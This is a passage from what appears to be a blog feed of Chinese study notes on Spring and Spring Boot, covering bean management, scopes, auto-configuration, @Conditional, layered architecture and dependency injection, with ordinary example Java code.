管理</h3><h4 id="1-获取bean"><a href="#1-获取bean" class="headerlink" title="1.获取bean"></a>1.获取bean</h4><p>默认情况下，Spring项目启动时, 会把bean都创建好放在I0C容器中，如果想要主动获取这些bean,可以通过如下</p><p>方式:</p><p>根据name获取bean：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Object <span class="hljs-title function_">getBean</span> <span class="hljs-params">(String name)</span><br></code></pre></td></tr></table></figure><p>根据类型获取bean：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;T&gt; T <span class="hljs-title function_">getBean</span> <span class="hljs-params">(Class&lt;T&gt; requiredType)</span><br></code></pre></td></tr></table></figure><p>根据name获取bean (带类型转换)：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;T&gt; T <span class="hljs-title function_">getBean</span><span class="hljs-params">(String name, Class&lt;T&gt; requiredType)</span><br></code></pre></td></tr></table></figure><p>注意事项</p><p>上述所说的【Spring项目启动时，会把其中的bean都创建好】还会受到作用域及延迟初始化影响，这里主要针对于默认的单例非延迟加载的bean而言。</p><h4 id="2-Bean作用域"><a href="#2-Bean作用域" class="headerlink" title="2.Bean作用域"></a>2.Bean作用域</h4><table><thead><tr><th>作用域</th><th>说明</th></tr></thead><tbody><tr><td>singleton*</td><td>容器内同名称的bean 只有一个实例(单例)(默认)</td></tr><tr><td>prototype*</td><td>每次使用该bean时会创建新的实例(非单例)</td></tr><tr><td>request</td><td>每个请求范围内会创建新的实例(web环境中,了解)</td></tr><tr><td>session</td><td>每个会话范围内会创建新的实例(web环境中,了解)</td></tr><tr><td>application</td><td>每个应用范围内会创建新的实例(web环境中,了解)</td></tr></tbody></table><p>可以用@Scope注解来进行配置作用域：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Scope(&quot;prototype&quot;)</span><br><span class="hljs-meta">@RestController</span><br><span class="hljs-meta">@RequestMapping(&quot;/depts&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DeptController</span> &#123;<br>&#125;<br></code></pre></td></tr></table></figure><p>注意事项：</p><ul><li>默认singleton的bean,在容器启动时被创建,可以使用@Lazy注解来延迟初始化( 延迟到第一次使用时) 。</li><li>prototype的bean,每一次使 用该bean的时候都会创建一个新的实例。</li><li>实际开发当中，绝大部分的Bean是单例的,也就是说绝大部分Bean不需要配置scope属性。</li></ul><h4 id="3、第三方Bean"><a href="#3、第三方Bean" class="headerlink" title="3、第三方Bean"></a>3、第三方Bean</h4><p>第三方bean用：@Bean</p><p>如果要管理的bean对象来自于第三方(不是自定义的)，是无法用@Component及衍生注解声明bean的，就需要用到@Bean注解。</p><p>直接定义到启动类当中（不建议）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@SpringBootApplication</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SpringbootWebConfig2App1ication</span> &#123;<br>    <span class="hljs-meta">@Bean</span><span class="hljs-comment">//将方法返回值交给IOC容器管理，成为IOC容器的bean对象</span><br>    <span class="hljs-keyword">public</span> SAXReader <span class="hljs-title function_">saxReader</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SAXReader</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>配置到方法中：（加注释）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration</span><span class="hljs-comment">//配置类</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CommonConfig</span> &#123;<br><span class="hljs-meta">@Bean</span><br><span class="hljs-keyword">public</span> SAXReader <span class="hljs-title function_">saxReader</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SAXReader</span>() ;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>@Bean注释：</p><p>将当前方法的返回值对象交给IOC容器管理, 成为IOC容器bean</p><p>通过@Bean注解的name/value属性指定bean名称, 如果未指定, 默认是方法名</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Test</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testGetBean2</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">saxReader</span> <span class="hljs-operator">=</span> applicationContext.getBean(<span class="hljs-string">&quot;reader&quot;</span>);<br>    <span class="hljs-comment">//&quot;&quot;内，默认是方法名</span><br>    System.out.println(saxReader);<br>&#125;<br></code></pre></td></tr></table></figure><p>需要依赖其他Bean对象，直接在方法中定义形参，容器会自动装配</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration</span> <span class="hljs-comment">//配置类</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CommonConfig</span> &#123;<br>    <span class="hljs-comment">//声明第三方bean</span><br>    <span class="hljs-meta">@Bean</span> <span class="hljs-comment">//将当前方法的返回值对象交给IOC容器管理, 成为IOC容器bean</span><br>          <span class="hljs-comment">//通过@Bean注解的name/value属性指定bean名称, 如果未指定, 默认是方法名</span><br>    <span class="hljs-keyword">public</span> SAXReader <span class="hljs-title function_">reader</span><span class="hljs-params">(DeptService deptService)</span>&#123;<br>        System.out.println(deptService);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SAXReader</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>总结：</p><p>通过@Bean注解的name或value属性’ 可以声明bean的名称，如果不指定,默认bean的名称就是方法名。</p><p>如果第三方bean需要依赖其它bean对象，直接在bean定义方法中设置形参即可，容器会根据类型自动装配。</p><p>问题思考：</p><p>@Component及衍生注解与@Bean注解使用场景?</p><p>项目中自定义的，使用@Component及其衍生注解</p><p>项目中引入第三方的，使用@Bean注解</p><h2 id="十、SpringBoot原理"><a href="#十、SpringBoot原理" class="headerlink" title="十、SpringBoot原理"></a>十、SpringBoot原理</h2><h3 id="1、Spring"><a href="#1、Spring" class="headerlink" title="1、Spring"></a>1、Spring</h3><p>Spring Framework框架：相对繁琐</p><p>Spring Boot框架：相对方便</p><p>原因：起步依赖（依赖传递）、自动配置</p><h3 id="2、自动配置"><a href="#2、自动配置" class="headerlink" title="2、自动配置"></a>2、自动配置</h3><p>SpringBoot的自动配置就是当Spring容器启动后，一些配置类、bean对象就自动存入到了IOC容器中，不需要我们手动去声明，从而简化了开发，省去了繁琐的配置操作。</p><p>自动配置原理</p><p>方案一: @ComponentScan 组件扫描（使用繁琐，性能低）</p><p>包扫描范围：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@ComponentScan(&#123;&quot;com.example&quot;,&quot;com.itheima&quot;&#125;)</span> <span class="hljs-comment">//设置包扫描范围</span><br><span class="hljs-meta">@SpringBootApplication</span> <span class="hljs-comment">//默认只扫描当前包及其子包</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SpringbootWebConfig2Application</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        SpringApplication.run(SpringbootWebConfig2Application.class, args);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/JavaWeb/2-2/14.png"></p><p>方案二：@lmport 导入。使用@Import导入的类会被Spring加载到IOC容器中，导入形式主要有以下几种：</p><ul><li>导入普通类 </li><li>导入配置类</li><li>导入ImportSelector接口实现类</li><li>@EnableXxxx注解，封装@Import注解(最方便)</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Import(&#123;TokenParser.class, HeaderConfig.class&#125;)</span><br><span class="hljs-meta">@SpringBootApplication</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SpringbootWebConfig2Application</span> &#123;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3、-Conditional"><a href="#3、-Conditional" class="headerlink" title="3、@Conditional"></a>3、@Conditional</h3><p>作用:按照- -定的条件进行判断，在满足给定条件后才会注册对应的bean对象到Spring I0C容器中。</p><p>位置：方法、类</p><ul><li>@Conditional本身是一个父注解，派生出大量的子注解：</li><li>@ConditionalOnClass：判断环境中是否有对应字节码文件，才注册bean到IOC容器。</li><li>@ConditionalOnMissingBean：判断环境中没有对应的bean (类型或名称)，才注册bean到IOC容器。</li><li>@ConditionalOnProperty：判断配置文件中有对应属性和值，才注册bean到IOC容器。</li></ul><p>举例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-meta">@ConditionalOnClass(name = &quot;io.jsonwebtoken.Jwts&quot;)</span> <span class="hljs-comment">//环境中存在指定的这个类，才会将该bean加入IOC容器</span><br><br><span class="hljs-comment">//@ConditionalonClass (name = &quot;io.jsonwebtoken.Jwts&quot;) //环境中存在指定的这个类，才会将该bean加入IOC容器中</span><br><span class="hljs-comment">//@ConditionalOnMissingBean // 不存在该类型的bean,才松将该bean加入I0C容器中 ---指定类型(value属性) 或名称(name属性)</span><br><span class="hljs-comment">//@ConditionalonProperty(name = &quot;name&quot;, havingValue = &quot;itheima&quot;) //配置文件中存在指定的属性与值，才会将该bean加入IOC容器外</span><br><br>    <span class="hljs-keyword">public</span> HeaderParser <span class="hljs-title function_">headerParser</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HeaderParser</span>();<br>    &#125;<br></code></pre></td></tr></table></figure><p><img src="/img/JavaWeb/2-2/15.png"></p><p>全部注册为IOC容器的bean??? NO!</p><p>SpringBoot会根据@Conditional注解条件装配</p><h3 id="4、自定义starter"><a href="#4、自定义starter" class="headerlink" title="4、自定义starter"></a>4、自定义starter</h3><p>在实际开发中，经常会定义-些公共组件,提供给各个项目团队使用。而在SpringBoot的项目中，一般会将这些公共组件封装为SpringBoot的starter。</p><p><img src="/img/JavaWeb/2-2/16.png"></p><p>案例：<br>需求：自定义aliyun-oss-spring-boot-starter，完成阿里云OSS操作工具类AliyunOSSUtils 的自动配置。<br>目标：引入起步依赖引入之后,要想使用阿里云OSS，注入AliyunOSSUtils直接使用即可。</p><h2 id="十一、Maven高级"><a href="#十一、Maven高级" class="headerlink" title="十一、Maven高级"></a>十一、Maven高级</h2>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JavaWeb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaWeb基础2-1</title>
    <link href="/2023/05/29/JavaWeb_2_1/"/>
    <url>/2023/05/29/JavaWeb_2_1/</url>
    
    <content type="html"><![CDATA[<h1 id="JavaWeb基础2-1"><a href="#JavaWeb基础2-1" class="headerlink" title="JavaWeb基础2-1"></a>JavaWeb基础2-1</h1><h2 id="一、SpringBoot"><a href="#一、SpringBoot" class="headerlink" title="一、SpringBoot"></a>一、SpringBoot</h2><h3 id="1、Spring"><a href="#1、Spring" class="headerlink" title="1、Spring"></a>1、Spring</h3><p>Spring官网：<a href="https://spring.io/">https://spring.io/</a></p><p>Spring当中的各种框架：<a href="https://spring.io/projects">https://spring.io/projects</a></p><p>Spring 发展到今天已经形成了一种开发生态圈，Spring 提供了若干个子项目，每个项目用于完成特定的功能。</p><p>基本都基于Spring Framework框架</p><p><img src="/img/JavaWeb/2-1/1.png"></p><h3 id="2、SpringBoot"><a href="#2、SpringBoot" class="headerlink" title="2、SpringBoot"></a>2、SpringBoot</h3><h4 id="1-基础"><a href="#1-基础" class="headerlink" title="1.基础"></a>1.基础</h4><p>Spring Boot可以帮助我们非常快速的构建应用程序、简化开发、提高效率。</p><p>构建的时候，选择Spring框架，选择Web，完成框架搭建。</p><p>使用SpringBoot的相关简单方法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.itheima.springboot_start.controller;<br><br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloController</span> &#123;<br>    <span class="hljs-meta">@RequestMapping(&quot;/hello&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">hello</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;hello world~&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;hello world&quot;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="2-传输参数"><a href="#2-传输参数" class="headerlink" title="2.传输参数"></a>2.传输参数</h4><h5 id="数组集合参数："><a href="#数组集合参数：" class="headerlink" title="数组集合参数："></a>数组集合参数：</h5><p>数组 ： 请求参数名与形参中数组变量名相同 ， 可以直接使用数组封装<br>集合 ： 请求参数名与形参中集合变量名相同 ， 通过@RequestParam绑定参数关系</p><h5 id="日期参数："><a href="#日期参数：" class="headerlink" title="日期参数："></a>日期参数：</h5><p>使用注解完成日期参数格式转换@DateTimeFormat</p><h5 id="JSON参数："><a href="#JSON参数：" class="headerlink" title="JSON参数："></a>JSON参数：</h5><p>JSON参数：JSON数据键名与形参对象属性名相同，定义pojo类型形参即可接收参数，需要使用@RequestBody标识</p><p><img src="/img/JavaWeb/2-1/2.png"></p><h5 id="路径参数："><a href="#路径参数：" class="headerlink" title="路径参数："></a>路径参数：</h5><p>路径参数：通过请求 URL 直接传递参数，使用 {…} 来标识该路径参数，需要使用 @PathVariable获取路径参数</p><p><img src="/img/JavaWeb/2-1/3.png"></p><h5 id="案例："><a href="#案例：" class="headerlink" title="案例："></a>案例：</h5><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure><h5 id="请求参数总结："><a href="#请求参数总结：" class="headerlink" title="请求参数总结："></a>请求参数总结：</h5><p><img src="/img/JavaWeb/2-1/4.png"></p><h5 id="统一响应结果："><a href="#统一响应结果：" class="headerlink" title="统一响应结果："></a>统一响应结果：</h5><p>让前后端接受的数据类型只有一种</p><p><img src="/img/JavaWeb/2-1/5.png"></p><h2 id="二、分层解耦"><a href="#二、分层解耦" class="headerlink" title="二、分层解耦"></a>二、分层解耦</h2><h3 id="1、三层架构"><a href="#1、三层架构" class="headerlink" title="1、三层架构"></a>1、三层架构</h3><p><img src="/img/JavaWeb/2-1/7.png"></p><h3 id="2、拆分实例"><a href="#2、拆分实例" class="headerlink" title="2、拆分实例"></a>2、拆分实例</h3><h4 id="直接调用相应的服务方法"><a href="#直接调用相应的服务方法" class="headerlink" title="直接调用相应的服务方法"></a>直接调用相应的服务方法</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"> <span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EmpController</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">EmpService</span> <span class="hljs-variable">empService</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EmpServiceA</span>();<br><br>    <span class="hljs-meta">@RequestMapping(&quot;/listEmp&quot;)</span><br>    <span class="hljs-keyword">public</span> Result <span class="hljs-title function_">list</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">//1.加载解析xml</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getClass().getClassLoader().getResource(<span class="hljs-string">&quot;emp.xml&quot;</span>).getFile();<br>        System.out.println(file);<br>        List&lt;Emp&gt; empList = XmlParserUtils.parse(file, Emp.class);<br><br>        <span class="hljs-comment">//2.对数据进行解析</span><br>        empList.stream().forEach(emp -&gt;&#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">gender</span> <span class="hljs-operator">=</span> emp.getGender();<br>            <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;1&quot;</span>.equals(gender)) &#123;<br>                emp.setGender(<span class="hljs-string">&quot;男&quot;</span>);<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;2&quot;</span>.equals(gender)) &#123;<br>                emp.setGender(<span class="hljs-string">&quot;女&quot;</span>);<br>            &#125;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">job</span> <span class="hljs-operator">=</span> emp.getJob();<br>            <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;1&quot;</span>.equals(job)) &#123;<br>                emp.setJob(<span class="hljs-string">&quot;讲师&quot;</span>);<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;2&quot;</span>.equals(job)) &#123;<br>                emp.setJob(<span class="hljs-string">&quot;班主任&quot;</span>);<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;3&quot;</span>.equals(job)) &#123;<br>                emp.setJob(<span class="hljs-string">&quot;班主任&quot;</span>);<br>            &#125;<br>        &#125;);<br>        <span class="hljs-keyword">return</span> Result.success(empList);<br>    &#125;<br></code></pre></td></tr></table></figure><h4 id="拆分为三层构架的方法"><a href="#拆分为三层构架的方法" class="headerlink" title="拆分为三层构架的方法"></a>拆分为三层构架的方法</h4><p>Controller（接受请求，响应数据）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EmpController</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">EmpService</span> <span class="hljs-variable">empService</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EmpServiceA</span>();<br><br>    <span class="hljs-meta">@RequestMapping(&quot;/listEmp&quot;)</span><br>    <span class="hljs-keyword">public</span> Result <span class="hljs-title function_">list</span><span class="hljs-params">()</span> &#123;<br>        List&lt;Emp&gt; empList = empService.ListEmp();<br>        <span class="hljs-keyword">return</span> Result.success(empList);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Service（逻辑处理）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EmpServiceA</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">EmpService</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">EmpDao</span> <span class="hljs-variable">empDao</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EmpDaoA</span>();<br>    <span class="hljs-comment">//2.对数据进行解析</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> List&lt;Emp&gt; <span class="hljs-title function_">ListEmp</span><span class="hljs-params">()</span> &#123;<br>        List&lt;Emp&gt; empList = empDao.ListEmp();<br>        empList.stream().forEach(emp -&gt;&#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">gender</span> <span class="hljs-operator">=</span> emp.getGender();<br>            <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;1&quot;</span>.equals(gender)) &#123;<br>                emp.setGender(<span class="hljs-string">&quot;男&quot;</span>);<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;2&quot;</span>.equals(gender)) &#123;<br>                emp.setGender(<span class="hljs-string">&quot;女&quot;</span>);<br>            &#125;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">job</span> <span class="hljs-operator">=</span> emp.getJob();<br>            <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;1&quot;</span>.equals(job)) &#123;<br>                emp.setJob(<span class="hljs-string">&quot;讲师&quot;</span>);<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;2&quot;</span>.equals(job)) &#123;<br>                emp.setJob(<span class="hljs-string">&quot;班主任&quot;</span>);<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;3&quot;</span>.equals(job)) &#123;<br>                emp.setJob(<span class="hljs-string">&quot;班主任&quot;</span>);<br>            &#125;<br>        &#125;);<br>        <span class="hljs-keyword">return</span> empList;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Dao（数据处理）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EmpDaoA</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">EmpDao</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> List&lt;Emp&gt; <span class="hljs-title function_">ListEmp</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">//1.加载解析xml</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getClass().getClassLoader().getResource(<span class="hljs-string">&quot;emp.xml&quot;</span>).getFile();<br>        System.out.println(file);<br>        List&lt;Emp&gt; empList = XmlParserUtils.parse(file, Emp.class);<br>        <span class="hljs-keyword">return</span> empList;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Service和Dao层次：需要写一个接口，然后再写一个实现类，便于之后更新管理</p><p><img src="/img/JavaWeb/2-1/8.png"></p><p>Service接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">EmpService</span> &#123;<br>    <span class="hljs-keyword">public</span> List&lt;Emp&gt; <span class="hljs-title function_">ListEmp</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>Dao接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">EmpDao</span> &#123;<br>    <span class="hljs-keyword">public</span> List&lt;Emp&gt; <span class="hljs-title function_">ListEmp</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>三层架构前后对比</p><p><img src="/img/JavaWeb/2-1/9.png"></p><h3 id="3、分层解耦"><a href="#3、分层解耦" class="headerlink" title="3、分层解耦"></a>3、分层解耦</h3><p>控制反转：lnversion Of Control,简称IOC。对象的创建控制权由程序自身转移到外部（容器），这种思想称为控制反转。<br>依赖注入：Dependency lnjection,简称DI。容器为应用程序提供运行时，所依赖的资源，称之为依赖注入。<br>Bean对象：IOC容器中创建、管理的对象，称之为beano</p><p><img src="/img/JavaWeb/2-1/10.png"></p><p>IOC&amp;DI 入门</p><p>1.Service 层及 Dao 层的实现类交给IOC 容器管理 。</p><p>-&gt;Service 层及 Dao 层上加上注解@Component</p><p>2.为 Controller 及 Service 注入运行时，依赖的对象 。</p><p>-&gt;Service 层及 Dao 层上加上注解@Autowired</p><p>3.运行测试 。</p><p>4.切换实现类</p><p>将不需要的@Component注释掉</p><p><img src="/img/JavaWeb/2-1/11.png"></p><table><thead><tr><th>注释</th><th>说明</th><th>位置</th></tr></thead><tbody><tr><td>@Component</td><td>声明bean的基础注解</td><td>不属于以下三类时，用此注解</td></tr><tr><td>@Controller</td><td>@Component的衍生注解</td><td>标注在控制器类上</td></tr><tr><td>@Service</td><td>@Component的衍生注解</td><td>标注在业务类上</td></tr><tr><td>@Repository</td><td>@Component的衍生注解</td><td>标注在数据访问类上(由于与mybatis整合，用的少)</td></tr></tbody></table><p>声明bean的时候，可以通过value属性指定bean的名字, 如果没有指定，默认为类名首字母小写。</p><p>使用以上四个注解都可以声明bean,但是在springboot集成web开发中，声明控制器bean只能用@Controller。</p><h3 id="4、Bean组件扫描"><a href="#4、Bean组件扫描" class="headerlink" title="4、Bean组件扫描"></a>4、Bean组件扫描</h3><p>前面声明bean的四大注解，要想生效，还需要被组件扫描注解@ComponentScan扫描。</p><p>@ComponentScan注解虽然没有显式配置，但是实际上已经包含在了启动类声明注解</p><p>@SpringBootApplication中，默认扫描的范围是启动类所在包及其子包。</p><p>@Autowired 注解，默认是按照类型进行，如果存在多个相同类型的bean，将会报出错误</p><p>通过以下几种方案来解决：</p><p>设置优先级：@Primary</p><p>指定类：@QuaIifier(“”)</p><p>@Resource(name = “”)</p><p>@Autowired是spring框架提供的注解，而@Resource是JDK提供的注解。</p><p>@Autowired默认是按照类型注入，而@Resource默认是按照名称注入。</p><h2 id="三、MySQL"><a href="#三、MySQL" class="headerlink" title="三、MySQL"></a>三、MySQL</h2><p>1、SQL语句通常被分为四大类：</p><table><thead><tr><th align="left">分类</th><th>全称</th><th>说明</th></tr></thead><tbody><tr><td align="left">DDL</td><td>Data Definition Language</td><td>数据定义语言，用来定义数据库对象(数据库，表，字段)</td></tr><tr><td align="left">DML</td><td>Data Manipulation Language</td><td>数据操作语言，用来对数据库表中的数据进行增删改</td></tr><tr><td align="left">DQL</td><td>Data Query Language</td><td>数据查询语言，用来查询数据库中表的记录</td></tr><tr><td align="left">DCL</td><td>Data Control 